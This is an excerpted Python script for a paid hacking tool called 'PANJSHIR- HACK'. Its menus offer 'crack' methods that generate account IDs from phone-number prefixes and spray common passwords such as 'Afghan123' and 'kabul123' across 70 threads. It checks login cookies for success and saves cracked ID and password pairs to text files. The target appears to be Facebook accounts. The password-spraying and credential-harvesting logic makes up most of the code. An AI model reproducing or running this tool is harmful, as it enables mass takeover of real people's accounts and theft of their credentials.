...
░▒▓█▓▒░              ░▒▓██████▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ 
----------------------------------------------
 \033[1;95mAuthor    : SULIAMAN
 \033[1;94mGithub    : SULIAMAN- PJR
 \033[1;93mFacebook  : RAYESS SULIAMAN PJR 
\033[1;92m Tool Name : PANJSHIR- HACK 
\033[1;96m Type type : PAID
\033[1;91m Version   : 0.1
----------------------------------------------
 \033[1;92mSULIAMAN PRO VERSION 0.8
 \033[1;93mFEEL THE POWER OF SULIAMAN (◔‿◔)
\033[1;92m====================================================""")  

def lines():
	print(f'\033[0;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37') 
...
def riaz():
	os.system('clear')
	print(logo)
	print('\33[1;37m[1] RANDOM CLON')
	print('\33[1;37m[2] SUB MY YOU TUBE')
	print('\33[1;37m[0]\x1b[1;91m EXIT ')
	print('\033[1;97m====================================================')
	...
	if riaz1 =='0':
		exit()
	if riaz1 =='3':
		os.system('https://t.me/RAYESSSULIAMNPJR')
	else:
...
def afg():
    os.system('clear')
    print(logo)
    print('\33[1;92m[1] METHOD 1_\32[1;32mCRACK MIX IDS  ')
    print('\33[1;92m[2] METHOD 2_\32[1;32mCRACK NEW IDS ')            
    print('\33[1;32m[3] METHOD 3_\32[1;32mCRACK OLD AND PUBG ID')
    print('\33[1;32m[4] \x1b[1;91mBACK MENU ')
    lines()
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('\33[1;31m CHOOSE CODE : 070, 079, 078, 073,076,077, 074')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print('\33[1;31m CHOOSE CODE : 070, 078, 073, 076, 077, 079, 074')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    print(logo)
    print('\33[1;31m EXAMPLE : 1000, 5000,100000,10000')
    lines()
    limit = int(input(' IDZ LEMIT : '))
    print(46*'-')
    for nmbr in range(limit):
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','۱۲۳۴۵۶۷۸','۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','50005000']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def m3():
    ...
    os.system('clear')
    print(logo)
    print(' \33[1;31mCHOOSE CODE : 9370, 9378, 9373, 9376, 9377, 9379, 9374')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'100200','Afghan123','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','۱۰۰۲۰۰','۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','50005000']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SULIAMAN-OK] '+cid+' | '+ps+'\033[0;97m\n[]\033[0;37m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('ASHKAR-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SULIAMAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SULIAMAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mSULIAMAN\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
